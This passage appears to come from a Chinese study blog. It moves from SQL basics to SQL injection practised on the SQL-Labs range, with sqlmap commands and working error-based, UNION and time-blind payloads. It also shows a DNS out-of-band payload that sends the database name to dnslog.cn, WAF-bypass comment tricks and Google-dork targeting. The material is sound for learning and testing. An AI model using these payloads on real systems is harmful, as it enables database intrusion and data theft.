关键字从左表（table1）返回所有的行，即使右表（table2）中没有匹配。如果右表中没有匹配，则结果为 NULL。</p><p><img src="Left.gif"></p><p>如下:</p><p><img src="Left.png"></p><p>(3) Right JOIN</p><p>RIGHT JOIN 关键字从右表（table2）返回所有的行，即使左表（table1）中没有匹配。如果左表中没有匹配，则结果为 NULL。</p><p>(4) FULL JOIN</p><p>MYSQL不支持</p><ol start="14"><li>ANY,ALL</li></ol><p>ALL，user_id 大于所有后面语句的查询结果<br>ANY，user_id 大于任意一个后面语句的查询结果</p><pre class="line-numbers language-none"><code class="language-none">SELECT * FROM users WHERE user_id  &gt; ALL (SELECT user_id FROM users)SELECT * FROM users WHERE user_id  &gt; ANY (SELECT user_id FROM users)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="15"><li>数据库操作</li></ol><p>创建数据库</p><pre class="line-numbers language-none"><code class="language-none">CREATE DATABASE &#96;violet&#96; CHARACTER SET &#39;utf8&#39; COLLATE &#39;utf8_bin&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除一个数据库</p><pre class="line-numbers language-none"><code class="language-none">DROP DATABASE violet;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>备份数据库</p><pre class="line-numbers language-none"><code class="language-none">BACKUP DATABASE root  TO DISK &#x3D; &#39;path&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建表</p><pre class="line-numbers language-none"><code class="language-none">CREATE TABLE &#96;root&#96;.&#96;Untitled&#96;  (  &#96;id&#96; int(10) NOT NULL AUTO_INCREMENT,  -- 列名id，int类型，不为空，自动增长  &#96;name&#96; varchar(255) NOT NULL,  &#96;pass&#96; varchar(255) NULL,  PRIMARY KEY (&#96;id&#96;));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改表</p><p>(1)添加列</p><pre class="line-numbers language-none"><code class="language-none">ALTER TABLE &#96;root&#96;.&#96;users&#96; ADD COLUMN &#96;violet&#96; varchar(255) NULL AFTER &#96;failed_login&#96;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>(2)删除</p><pre class="line-numbers language-none"><code class="language-none">ALTER TABLE &#96;root&#96;.&#96;users&#96; Drop COLUMN &#96;violet&#96; varchar(255) NULL AFTER &#96;failed_login&#96;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>(3)修改类型</p><pre class="line-numbers language-none"><code class="language-none">ALTER TABLE &#96;root&#96;.&#96;users&#96; alter COLUMN &#96;violet&#96; int;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="SQLMAP的使用"><a href="#SQLMAP的使用" class="headerlink" title="SQLMAP的使用"></a>SQLMAP的使用</h2><p>我们使用SQL-LABS进行学习。</p><h3 id="error-based"><a href="#error-based" class="headerlink" title="error-based"></a>error-based</h3><h4 id="首先如何确认有SQL注入呢"><a href="#首先如何确认有SQL注入呢" class="headerlink" title="首先如何确认有SQL注入呢?"></a>首先如何确认有SQL注入呢?</h4><p>根据上面所学，我们可以使用’”等，来进行报错，进而判断有无注入点。<br><img src="pass1.png"></p><p>我们再本机环境中测试，发现错误与靶场所爆出的错误基本相同，</p><p><img src="pass1-2.png"></p><p>而查看源文件的SQL语句为，</p><pre class="line-numbers language-none"><code class="language-none">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">SELECT * FROM users WHERE user_id &#x3D; &#39;$id&#39; -- &#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们再试一下”呢，然而没有用。</p><p>如果想学手工注入，则可以看sqlmap中xml语句，进行学习。</p><h4 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h4><ol><li>在以下的界面中，我们可以进行选择获得的信息，譬如我选择了获得当前数据库名。  </li></ol><p><img src="sqlmap-dk-1.png"></p><p>命令行中语句为</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u &#39;http:&#x2F;&#x2F;ec741729-e1f3-4c04-96e6-f8823694221f.node4.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&#39; --skip-static --technique&#x3D;E --current-db<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>–technique=E为报错注入，–current-db，为获得当前的数据库。</p><ol start="2"><li>如果获得当前的用户名呢？</li></ol><p>很明显–current-user。</p><pre class="line-numbers language-语句为" data-language="语句为"><code class="language-语句为">1&#39; AND (SELECT 7663 FROM(SELECT COUNT(*),CONCAT(0x716b766a71,(MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,54)),0x716a7a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- vNjX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-结果为" data-language="结果为"><code class="language-结果为">18:46:41] [INFO] fetching current user[18:46:41] [INFO] retrieved: &#39;root@localhost&#39;current user: &#39;root@localhost&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="3"><li>此外还能获得其他很多信息，譬如：表，列，等</li></ol><p>那么如果只是查询一个特定表，特定库呢？也很简单</p><pre class="line-numbers language-none"><code class="language-none">库: -D 库名表: -T 表名列: -C 列名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="Union查询"><a href="#Union查询" class="headerlink" title="Union查询"></a>Union查询</h3><p>如果不报错时，报错查询就无法使用。</p><p>那么就让我们看一下sqlmap的union注入的思路</p><p>首先使用判断其闭合的符号为什么。</p><pre class="line-numbers language-none"><code class="language-none">19:56:54] [INFO] testing &#39;Generic UNION query (NULL) - 1 to 10 columns&#39;&#x3D;&gt;1&#x3D;&gt;1) ORDER BY 1-- -&#x3D;&gt;1) ORDER BY 5583-- -&#x3D;&gt;1 ORDER BY 1-- -&#x3D;&gt;1 ORDER BY 1115-- -&#x3D;&gt;1 ORDER BY 1-- -&#x3D;&gt;1 ORDER BY 3952-- -&#x3D;&gt;1&#39;) ORDER BY 1-- -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后判断有几列</p><pre class="line-numbers language-none"><code class="language-none"> [INFO] &#39;ORDER BY&#39; technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test&#x3D;&gt;1&#39; ORDER BY 10-- -&#x3D;&gt;1&#39; ORDER BY 6-- -&#x3D;&gt;1&#39; ORDER BY 4-- -&#x3D;&gt;1&#39; ORDER BY 3-- -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后判断是否有注入点</p><pre class="line-numbers language-none"><code class="language-none">19:56:56] [INFO] target URL appears to have 3 columns in query&#x3D;&gt;1&#39; UNION ALL SELECT NULL,CONCAT(0x716b766a71,0x62514944434e754576417366414f73726d647772597649646d5571494a7a6c616a71504b76684a6c,0x716a7a7871),NULL-- -&#x3D;&gt;1&#39; UNION ALL SELECT NULL,NULL,CONCAT(0x716b766a71,0x6e7a49536f61696a6c41486747774d79596c514650434e43665a464e765a4148764b736672435065,0x716a7a7871)-- -&#x3D;&gt;1&#39; UNION ALL SELECT CONCAT(0x716b766a71,0x6b546266597147457879727172504b7a7659596e717a48695043684963435a744465637776654c76,0x716a7a7871),NULL,NULL-- -&#x3D;&gt;1&#39; UNION ALL SELECT NULL,CONCAT(0x716b766a71,0x4b6b4573774577746151,0x716a7a7871),NULL-- -&#x3D;&gt;1&#39; UNION ALL SELECT NULL,NULL,CONCAT(0x716b766a71,0x74675064785a587a5658,0x716a7a7871)-- -&#x3D;&gt;1&#39; UNION ALL SELECT CONCAT(0x716b766a71,0x5758584e6e73634a6a52,0x716a7a7871),NULL,NULL-- -&#x3D;&gt;-3620&#39; UNION ALL SELECT NULL,CONCAT(0x716b766a71,0x45626e76634a704b5a4a48486846777357454c665072487a6662676c4c436e694e4b55477545534c,0x716a7a7871),NULL-- -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再然后判断是否为DBA</p><pre class="line-numbers language-none"><code class="language-none">-7861&#39; UNION ALL SELECT NULL,CONCAT(0x716b766a71,(CASE WHEN  -- WHEN a THEN b ELSE c END 相当于 if a &#123;b;&#125;(  -- else c;(SELECT super_priv FROM mysql.user WHERE user&#x3D;0x726f6f74 LIMIT 0,1)&#x3D;0x59) THEN 1  ELSE 0END),0x716a7a7871),NULL-- -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实操作与报错查询也基本一样。</p><h3 id="boolen"><a href="#boolen" class="headerlink" title="boolen"></a>boolen</h3><p>靶场为SQL-Labs less11</p><p>首先此关卡为POST方式，所以指令方面与上面有所不同</p><pre class="line-numbers language-none"><code class="language-none">--method post --data &quot;passwd&#x3D;-111&#39;&amp;submit&#x3D;Submit&amp;uname&#x3D;111&quot; -p uname -tamper&#x3D;print-.py -technique B<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>–method为post方式请求。–data 为数据包内容，-p为注入的目标 后面的与之前相同。</p><h3 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h3><p>可以再request页面打开写有请求头的文件来进行注入，注入点标记为*</p><p><img src="sqlmap2.png"></p><p>注意sqlmap的请求头部中USER-Agent，一般都会带着sqlmap的特定信息，所以我们需要进行修改。</p><p>moblie就代表着将报文伪装成手机端。 random-agent一般都要携带。</p><p><img src="sqlmap3.png"></p><h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><h3 id="OOB"><a href="#OOB" class="headerlink" title="OOB"></a>OOB</h3><p>上面所学的都为In band的注入。既然有In Band 那么便有out of band,” <strong>OOB</strong> “</p><p><img src="inout.png"></p><p>第三方使用的就是<a href="dnslog.cn">dnslog.cn</a></p><p>我们再使用时，可能也会使用到如下语句</p><pre class="line-numbers language-none"><code class="language-none">SELECT LOAD_FILE(&#39;a&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此语句的作用就为打开文件，使用的协议为unc（远程访问一个文件）</p><p>在Windows中运行中可以使用\加域名之类的，来进行远程访问</p><p>那么如何注入使用呢？很简单看下面</p><pre class="line-numbers language-none"><code class="language-none">SELECT load_file(CONCAT(&#39;\\\\&#39;,(SELECT DATABASE()),&#39;.8er59e.dnslog.cn\\1.txt&#39;))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后结果会显示在dnslog上，为 数据库名.域名。之所以使用四个反斜线是为了转义。</p><pre class="line-numbers language-none"><code class="language-none">\\root.8er59e.dnslog.cn\1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information.schema"></a>information.schema</h3><p>系统数据库</p><p>存储数据库的基本信息，譬如各个数据库的表，用户等等等。 在注入语句中经常会出现这个库</p><p><img src="information_schema.png"></p><pre class="line-numbers language-none"><code class="language-none">1&#39; AND (SELECT 9014 FROM(SELECT COUNT(*),CONCAT(0x716b766a71,(SELECT MID((IFNULL(CAST(grantee AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 113,1),0x716a7a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- PNUb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="获得注入点"><a href="#获得注入点" class="headerlink" title="获得注入点"></a>获得注入点</h4><p>报错注入payload:</p><pre class="line-numbers language-none"><code class="language-none">id&#x3D;1&#39; AND (SELECT 1710 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(SELECT (ELT(1710&#x3D;1710,1))),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TBlX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>分解:</p><pre class="line-numbers language-none"><code class="language-none">SELECT1710 FROM(SELECTCOUNT(*),CONCAT(0x716a6a7171,(SELECT(ELT( 1710 &#x3D; 1710, 1 ))),      -- ELT(a,b,c,d, ....) 为a&#x3D;1取b,为2取c,为3取d依次类推0x716b626a71,                   -- 其实就是Ascii码FLOOR( RAND( 0 )* 2 )) x          -- 该函数返回X的最大整数值，但不能大于X; MySQL Rand() 函数可以被调用，以产生一个在 0 和 1 之间的随机数：                                      -- 如果在一条查询语句中rand內的值相同，那么rand出值也相同。FROMINFORMATION_SCHEMA.PLUGINS GROUP BYx                                   -- x为concat得出的结果，结果为qjjqq1qkbjq0 很明显你不能这样进行分组，直接报错了。) a -- TBlX<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="获得当前用户"><a href="#获得当前用户" class="headerlink" title="获得当前用户"></a>获得当前用户</h4><p>我们知道了有注入点，接下来就是获得数据库的相关信息了，这里一当前用户为例</p><pre class="line-numbers language-none"><code class="language-none">1&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,54)),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uwIe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>分解</p><pre class="line-numbers language-none"><code class="language-none">SELECT1343 FROM(SELECTCOUNT(*),CONCAT(0x716a6a7171,(MID                      -- SELECT MID(ColumnName, Start [, Length])                               -- 从start开始(初始值为1)，从columnName中截取长度为Length的字符串。      (        ( IFNULL               -- IFNULL它接受两个参数，如果不是NULL，则返回第一个参数。 否则，IFNULL函数返回第二个参数。        ( CAST( CURRENT_USER () AS NCHAR ),         0x20 )),               -- CAST()函数将任何类型的值转换为具有指定类型的值。目标类型可以是以下类型之一：BINARY，         1, 54 )               -- CHAR，DATE，DATETIME，TIME，DECIMAL，SIGNED，UNSIGNE        ),         , 0x716b626a71,FLOOR( RAND( 0 )* 2 )) x FROMINFORMATION_SCHEMA.PLUGINS GROUP BYx ) a ) -- uwIe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>经过分解我们知道了上面语句工作原理，通过Current_user()来进行查询现在的用户，并通过报错的方式来进行显示。</p><p>查询表payload为</p><pre class="line-numbers language-none"><code class="language-none">1&#39; AND (SELECT 9086 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(SELECT MID((IFNULL(CAST(table_schema AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x637466747261696e696e67,0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61,0x7365637572697479,0x74657374) LIMIT 161,1),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- DOMI<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据上面两个语句，我们完全可以自己写为，payload为,若要查看其他包只需要修改concat中LIMITa,1中a。</p><p>至于查列等，完全一个思路。</p><pre class="line-numbers language-none"><code class="language-none">1&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(SELECT MID((IFNULL(CAST((table_schema) AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uwIe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果为<br><img src="payload1.png"></p><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>继续上面的步骤</p><p>payload为</p><pre class="line-numbers language-none"><code class="language-none">id&#x3D;-5409&#39; UNION ALL SELECT NULL,NULL,CONCAT(0x716a6a7171,0x6e4f6c51756c414255704d66767a6e6361737062516b617977624e4b6f734b61567a674a74446265,0x716b626a71)-- -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个语句十分简单，就是判断数据库有几列的。没什么可说的</p><p>接下查询一下表</p><pre class="line-numbers language-none"><code class="language-none">-6736&#39; UNION ALL SELECT NULL,NULL,(SELECT CONCAT(0x716a6a7171,IFNULL(CAST(table_schema AS NCHAR),0x20),0x666d62757070,IFNULL(CAST(table_name AS NCHAR),0x20),0x716b626a71) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x637466747261696e696e67,0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61,0x7365637572697479,0x74657374) LIMIT 44,1)-- -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下继续分析</p><pre class="line-numbers language-none"><code class="language-none">SELECT NULL,NULL,(   -- 7information_schema7INNODB_TEMP_TABLE_INFO7SELECTCONCAT( 0x37, IFNULL( CAST( table_schema AS NCHAR ), 0x20 ), 0x37, IFNULL( CAST( table_name AS NCHAR ), 0x20 ), 0x37 ) FROMINFORMATION_SCHEMA.TABLES WHEREtable_schema IN ( 0x637466747261696e696e67, 0x696e666f726d6174696f6e5f736368656d61, 0x6d7973716c, 0x706572666f726d616e63655f736368656d61, 0x7365637572697479, 0x74657374 ) LIMIT 44,1 ) -- -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  这个语句总体来并没有我们不会的点，它的函数我们在上面报错查询的时候已经解释了。那么这个语句是如何工作的呢？很简单，其实就是通过table_schema以及table_name from information.schema.tables中得到的表的相关信息。至于这个库我们在上面也已经说过了。很简单对吧。</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>获得注入点</p><pre class="line-numbers language-none"><code class="language-none">id&#x3D;1&#39; AND (SELECT 9312 FROM (SELECT(SLEEP(5)))fwfI)-- JUHW<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>核心函数就是sleep(5)</p><p>获得有哪些数据库怎么看呢?payload如下</p><pre class="line-numbers language-none"><code class="language-none">1 AND (SELECT 6762 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 5,1),5,1))&gt;1,0,1)))))cjhE)-- DmLI<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>分解</p><pre class="line-numbers language-none"><code class="language-none">1 AND (SELECT6762 FROM(SELECT(SLEEP(1- (IF                      (ORD(-- 如果最左边的字符不是一个多字节字符，ORD()返回的值和ASCII()函数返回的值相同。MID(( SELECT DISTINCT ( IFNULL( CAST( schema_name AS NCHAR ), 0x20  ) ) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 5, 1 ), 5, 1 ))&gt; 1,-- 通过大于判断来获得所取字符串的ascii码0,                                            -- 大于1则取0，否则取11 ))))) cjhE                                      -- “1 - 语句” 的意思便为只要所取的子字符串符合判断便不sleep                                                            -- 由此获得所包含的数据库) -- DmLI<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过上面的分析，我们便可以知道时间盲注的原理。</p><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>不再赘述，如果想研究，可以自己使用sqlmap来进行测试。</p><h3 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h3><h4 id="堆叠注入。"><a href="#堆叠注入。" class="headerlink" title="堆叠注入。"></a>堆叠注入。</h4><p>其实就是多条语句进行执行，没什么特别的。</p><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>可以使用以下网站进行正则表达式的匹配。<br><a href="https://regex101.com/">https://regex101.com/</a></p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>// 使用x64Debug对安全狗进行逆向分析。</p><p>安全狗</p><p>and 绕过</p><pre class="line-numbers language-none"><code class="language-none">Select * from user where id &#x3D;1 &#x2F;*%&#x2F;&quot;!*&#x2F; and&#x2F;*%&#x2F;&quot;!*&#x2F; 1&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>union 绕过</p><pre class="line-numbers language-none"><code class="language-none">Select * from user &#x2F;*%&#x2F;&quot;!*&#x2F;UNION&#x2F;*%&#x2F;&quot;!*&#x2F; &#x2F;*%&#x2F;&quot;!*&#x2F;SELECT &#x2F;*%&#x2F;&quot;!*&#x2F;1,2,3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Sleep</p><pre class="line-numbers language-none"><code class="language-none">可以通过增加空格<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><h3 id="目标选择"><a href="#目标选择" class="headerlink" title="目标选择"></a>目标选择</h3><h4 id="u-URL"><a href="#u-URL" class="headerlink" title="-u URL"></a>-u URL</h4><h4 id="c-CONFIG"><a href="#c-CONFIG" class="headerlink" title="-c CONFIG"></a>-c CONFIG</h4><pre class="line-numbers language-none"><code class="language-none">读取记录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="x-SITEMAPURL"><a href="#x-SITEMAPURL" class="headerlink" title="-x SITEMAPURL"></a>-x SITEMAPURL</h4><pre class="line-numbers language-none"><code class="language-none">从xml文件中解析目标<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="m-BULKFILE"><a href="#m-BULKFILE" class="headerlink" title="-m BULKFILE"></a>-m BULKFILE</h4><pre class="line-numbers language-none"><code class="language-none">大文件读取<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="r-REQUEST"><a href="#r-REQUEST" class="headerlink" title="-r REQUEST"></a>-r REQUEST</h4><pre class="line-numbers language-none"><code class="language-none">加载HTTP请求报文<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="g-GOOGLEDORK"><a href="#g-GOOGLEDORK" class="headerlink" title="-g GOOGLEDORK"></a>-g GOOGLEDORK</h4><pre class="line-numbers language-none"><code class="language-none">通过谷歌搜索得到的url作为目标inurl:php?id&#x3D;1sqlmap.py -g &quot;inurl:\&quot;.php?id&#x3D;1\&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="–wizard"><a href="#–wizard" class="headerlink" title="–wizard"></a>–wizard</h4><pre class="line-numbers language-none"><code class="language-none">引导操作<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h3><h4 id="–method-METHOD"><a href="#–method-METHOD" class="headerlink" title="–method=METHOD"></a>–method=METHOD</h4><pre class="line-numbers language-none"><code class="language-none">POSTGETHEADPUTDELETECONNECTOPINIONSTRACEPARCH<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="–data-DATA"><a href="#–data-DATA" class="headerlink" title="–data=DATA"></a>–data=DATA</h4><pre class="line-numbers language-none"><code class="language-none">指定POST参数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–param-del-PARA-Character-used-for-splitting-parameter-values"><a href="#–param-del-PARA-Character-used-for-splitting-parameter-values" class="headerlink" title="–param-del=PARA.. Character used for splitting parameter values"></a>–param-del=PARA.. Character used for splitting parameter values</h4><pre class="line-numbers language-none"><code class="language-none">譬如将data中参数进行拆分<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–cookie-COOKIE"><a href="#–cookie-COOKIE" class="headerlink" title="–cookie=COOKIE"></a>–cookie=COOKIE</h4><pre class="line-numbers language-none"><code class="language-none">指定cookie的值<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–cookie-del-COO"><a href="#–cookie-del-COO" class="headerlink" title="–cookie-del=COO"></a>–cookie-del=COO</h4><pre class="line-numbers language-none"><code class="language-none">分割cookie值的字符<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–load-cookies"><a href="#–load-cookies" class="headerlink" title="–load-cookies"></a>–load-cookies</h4><pre class="line-numbers language-none"><code class="language-none">从文件中读取cookie的值，格式为Netscape&#x2F;wget<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–drop-set-cookie"><a href="#–drop-set-cookie" class="headerlink" title="–drop-set-cookie"></a>–drop-set-cookie</h4><pre class="line-numbers language-none"><code class="language-none">丢弃响应头中set-cookie<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–user-agent-HTTP-User-Agent"><a href="#–user-agent-HTTP-User-Agent" class="headerlink" title="–user-agent HTTP User-Agent"></a>–user-agent HTTP User-Agent</h4><pre class="line-numbers language-none"><code class="language-none">设置user-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–random-agent-Use-radomly-selected-HTTP-User-Agent-header-value"><a href="#–random-agent-Use-radomly-selected-HTTP-User-Agent-header-value" class="headerlink" title="–random-agent  Use radomly selected HTTP User-Agent header value"></a>–random-agent  Use radomly selected HTTP User-Agent header value</h4><pre class="line-numbers language-none"><code class="language-none">随机选用sqlmap目录中User-Agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–host-HOST"><a href="#–host-HOST" class="headerlink" title="–host=HOST"></a>–host=HOST</h4><pre class="line-numbers language-none"><code class="language-none">选择HOST<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–referer-REFERER"><a href="#–referer-REFERER" class="headerlink" title="–referer=REFERER"></a>–referer=REFERER</h4><pre class="line-numbers language-none"><code class="language-none">修改referer值<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="H-HEADER-–hea"><a href="#H-HEADER-–hea" class="headerlink" title="-H HEADER –hea"></a>-H HEADER –hea</h4><pre class="line-numbers language-none"><code class="language-none">指定任何一个头部-H &quot;host&#x3D;127.0.0.1\n xxx:nnn&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="–auth-type-AUTH"><a href="#–auth-type-AUTH" class="headerlink" title="–auth-type=AUTH .."></a>–auth-type=AUTH ..</h4><pre class="line-numbers language-none"><code class="language-none">指定http认证类型<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–auth-file-AUTH"><a href="#–auth-file-AUTH" class="headerlink" title="–auth-file=AUTH"></a>–auth-file=AUTH</h4><pre class="line-numbers language-none"><code class="language-none">制定一个私钥文件来认证<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–ignore-401"><a href="#–ignore-401" class="headerlink" title="–ignore-401"></a>–ignore-401</h4><pre class="line-numbers language-none"><code class="language-none">忽略401错误<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–proxy-PROXY"><a href="#–proxy-PROXY" class="headerlink" title="–proxy=PROXY"></a>–proxy=PROXY</h4><pre class="line-numbers language-none"><code class="language-none">添加代理<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–proxy-cred-PRO"><a href="#–proxy-cred-PRO" class="headerlink" title="–proxy-cred=PRO"></a>–proxy-cred=PRO</h4><pre class="line-numbers language-none"><code class="language-none">代理认证方式譬如:用户名密码。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="–proxy-file"><a href="#–proxy-file" class="headerlink" title="–proxy-file="></a>–proxy-file=</h4><h4 id="–ignore-proxy"><a href="#–ignore-proxy" class="headerlink" title="–ignore-proxy"></a>–ignore-proxy</h4><h4 id="–tor-TOR"><a href="#–tor-TOR" class="headerlink" title="–tor=TOR"></a>–tor=TOR</h4><h4 id="–tor-port-TOR-PORT"><a href="#–tor-port-TOR-PORT" class="headerlink" title="–tor-port=TOR-PORT"></a>–tor-port=TOR-PORT</h4><h4 id="–check-tor-Check-to-see-if-TOr-is-used-properly"><a href="#–check-tor-Check-to-see-if-TOr-is-used-properly" class="headerlink" title="–check-tor  Check to see if TOr is used properly"></a>–check-tor  Check to see if TOr is used properly</h4><h4 id="–delay-DELAY"><a href="#–delay-DELAY" class="headerlink" title="–delay=DELAY"></a>–delay=DELAY</h4><pre 